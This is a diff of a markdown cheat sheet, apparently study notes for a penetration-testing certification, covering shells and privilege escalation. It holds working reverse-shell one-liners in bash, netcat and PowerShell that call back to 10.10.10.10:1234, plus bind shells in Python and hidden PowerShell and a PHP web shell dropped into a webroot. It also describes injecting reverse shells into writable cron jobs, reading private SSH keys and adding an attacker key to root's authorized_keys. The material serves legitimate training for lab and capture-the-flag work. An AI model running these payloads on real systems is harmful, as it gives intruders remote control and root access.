@@ -1,35 +1,35 @@
-# 🧠 CPTS Cheatsheet – Shells & Privilege Escalation
+# I) Type of shells
+
+* Bash (linux) or Powershell (Windows)
 
 ---
 
-# I) Shells
+## To connect to a shell:
 
-## 🔹 Types of Shells
-
-* **Bash** (Linux)
-* **PowerShell** (Windows)
-
-### 🔌 Remote Access Methods
-
-* **SSH** (Linux)
-* **WinRM** (Windows)
+* SSH for linux
+* WinRM for Windows
 
 ---
 
-## 🔹 Shell Types
+## We could connect to a remote host through:
 
-### 1. Reverse Shell
+* **Reverse shell** → connects back to our system and gives us control through reverse connection
+* **Bind shell** → waits for us to connect to it and gives us control once we do
+* **Web shell** → communicates through a web server, pass command directly on web and get the response
 
-* Target connects **back to attacker**
-* Most common & easiest method
+---
 
-#### Listener (Attacker)
+## a) Reverse shell
+
+Most common type of shell, quickest and easiest method to obtain control over compromised host.
+
+### Netcat listener:
 
 ```bash
 nc -lvnp 4444
 ```
 
-#### Find your IP
+### Find our own IP:
 
 ```bash
 ip a
@@ -37,31 +37,41 @@ ifconfig
 ipconfig
 ```
 
-#### Reverse Shell Examples
+---
+
+### Reverse shell commands:
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
 
 ```bash
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 1234 > /tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 
 ```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);..."
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
 
 ---
 
-### 2. Bind Shell
+## b) Bind shell
 
-* Target opens port → attacker connects
-
-#### Examples
+Here we have to connect to the targets through a listening port.
 
 ```bash
-rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 > /tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
 ```
+
+```bash
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+```
+
+```powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
+```
+
+Once we execute the bind shell command, we should have a shell waiting for us on the specified port, then we can connect to it:
 
 ```bash
 nc <IP> <PORT>
@@ -69,11 +79,28 @@ nc <IP> <PORT>
 
 ---
 
-### 3. Web Shell
+## Upgrading TTY (shell for more command)
 
-* Execute commands via web server
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
 
-#### Examples
+```bash
+ctrl+z
+stty raw -echo
+fg
+```
+
+Sometimes the shell doesn’t fit all the terminal:
+
+```bash
+export TERM=xterm-256color
+stty rows 67 columns 318
+```
+
+---
+
+## c) Web Shell
 
 ```php
 <?php system($_REQUEST["cmd"]); ?>
@@ -89,16 +116,19 @@ nc <IP> <PORT>
 
 ---
 
-## 🔹 Webroot Locations
+## Uploading the web shell
 
-* Apache → `/var/www/html`
-* Nginx → `/usr/local/nginx/html`
-* IIS → `C:\inetpub\wwwroot`
-* XAMPP → `C:\xampp\htdocs`
+* need to be uploaded in the webroot
+* can be through a vulnerability for uploading file
 
----
+### Webroot paths:
 
-## 🔹 Upload Web Shell Example
+* Apache → /var/www/html
+* Nginx → /usr/local/nginx/html/
+* IIS → c:\inetpub\wwwroot\
+* XAMPP → c:\xampp\htdocs\
+
+Example:
 
 ```bash
 echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
@@ -106,208 +136,155 @@ echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
 
 ---
 
-## 🔹 Upgrade TTY (IMPORTANT 🔥)
-
-```bash
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-```
-
-Then:
-
-```bash
-Ctrl + Z
-stty raw -echo
-fg
-```
-
-Fix terminal:
-
-```bash
-export TERM=xterm-256color
-stty rows 67 columns 318
-```
-
----
-
 # II) Privilege Escalation
 
-## 🎯 Goal
+Goal is to be:
 
-* **Linux** → root
-* **Windows** → Administrator / SYSTEM
+* root (linux)
+* administrator / SYSTEM (windows)
 
 ---
 
-## 🔹 Enumeration (Manual)
+## a) PriEsc Checklists
+
+* Linux Hacktricks: https://hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+
+* Windows Hacktricks: https://hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
+
+* Linux PayloadAllTheThings:
+  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+
+* Windows PayloadAllTheThings:
+  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
+---
+
+## b) Enumeration scripts
+
+There is automated tools that could do all these checklists:
+
+### Linux:
+
+* linEnum: https://github.com/rebootuser/LinEnum
+* linuxprivchecker: https://github.com/sleventyeleven/linuxprivchecker
+
+### Windows:
+
+* seatbelt: https://github.com/GhostPack/Seatbelt
+* jaws: https://github.com/411Hall/JAWS
+
+### Both:
+
+* PEASS: https://github.com/peass-ng/PEASS-ng
+
+---
+
+## Furthermore we could look for:
+
+* outdated kernel / OS
+* vulnerable software
+
+  * linux → dpkg -l
+  * windows → C:\Program Files
+* user privileges
+
+  * linux → sudo
+  * windows → token privileges
+
+---
+
+### View our privileges:
 
 ```bash
-id
-whoami
-uname -a
 sudo -l
 ```
 
----
-
-## 🔹 Automated Tools
-
-* linEnum
-* linuxprivchecker
-* Seatbelt (Windows)
-* JAWS (Windows)
-* PEASS suite
-
----
-
-## 🔹 What to Look For
-
-### 🔥 1. Kernel / OS
+### Switch to root:
 
 ```bash
-uname -a
-```
-
-### 🔥 2. Installed Software
-
-```bash
-dpkg -l
+sudo su -
 ```
 
 ---
 
-### 🔥 3. Sudo Privileges
-
-```bash
-sudo -l
-```
-
-👉 Check exploitable binaries:
+List of command that could be exploited with Sudo:
 https://gtfobins.org/
 
 ---
 
-### 🔥 4. SUID Binaries
+## c) Scheduled task
 
-```bash
-find / -perm -4000 2>/dev/null
-```
+We can add new cron/tasks jobs or trick them to execute malware if we have write permission in:
 
----
+* /etc/crontab
+* /etc/cron.d
+* /var/spool/cron/crontabs/root
 
-### 🔥 5. Scheduled Tasks (Cron Jobs)
-
-Important locations:
-
-```bash
-/etc/crontab
-/etc/cron.d
-/var/spool/cron/crontabs/root
-```
-
-👉 If writable → inject reverse shell
+If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.
 
 ---
 
-### 🔥 6. Writable Files
+## d) Exposed credentials
 
-```bash
-find / -writable -type f 2>/dev/null
-```
+It could be found in:
 
----
+* configurations files
+* log files
+* user history
 
-### 🔥 7. Exposed Credentials
-
-Check:
-
-* config files
-* logs
-* history
-
-```bash
-cat ~/.bash_history
-```
+  * bash_history (linux)
+  * PSReadLine (windows)
 
 ---
 
-### 🔥 8. SSH Keys
+## e) SSH Keys
 
-#### Find SSH directories
+We may have read access over a .ssh directory and may found:
+
+* /home/user/.ssh/id_rsa
+* /root/.ssh/id_rsa
+
+---
+
+### If we have read access:
 
 ```bash
-find / -type d -name ".ssh" 2>/dev/null
-```
-
-#### Read private key
-
-```bash
+vim id_rsa
 cat id_rsa
 chmod 600 id_rsa
-```
-
-#### Connect
-
-```bash
-ssh user@IP -i id_rsa
+ssh root@IP -i id_rsa
 ```
 
 ---
 
-### 🔥 Add your SSH key (Privilege Escalation)
+### If we have write access:
+
+We can place our public key in:
+
+* /home/user/.ssh/authorized_keys
+
+---
+
+### To create our ssh key:
 
 ```bash
 ssh-keygen -f key
 ```
 
 ```bash
-echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
+echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
 ```
 
 ```bash
-ssh root@IP -i key
+ssh root@10.10.10.10 -i key
 ```
 
 ---
 
-# 🧠 Pro Tips
-
-* Always check:
+### Find something globally:
 
 ```bash
-sudo -l
+find / -type d -name ".ssh" 2>/dev/null
 ```
-
-* Then:
-
-```bash
-find / -perm -4000 2>/dev/null
-```
-
-* Then:
-
-```bash
-cat /etc/crontab
-```
-
-👉 80% of privesc = these 3
-
----
-
-# ⚡ Fast CTF Workflow
-
-```bash
-sudo -l
-find / -perm -4000 2>/dev/null
-getcap -r / 2>/dev/null
-cat /etc/crontab
-find / -writable -type f 2>/dev/null
-```
-
----
-
-# 🔥 Mindset
-
-👉 Enumeration = everything
-👉 Tools help, but **you exploit manually**
 
 ---
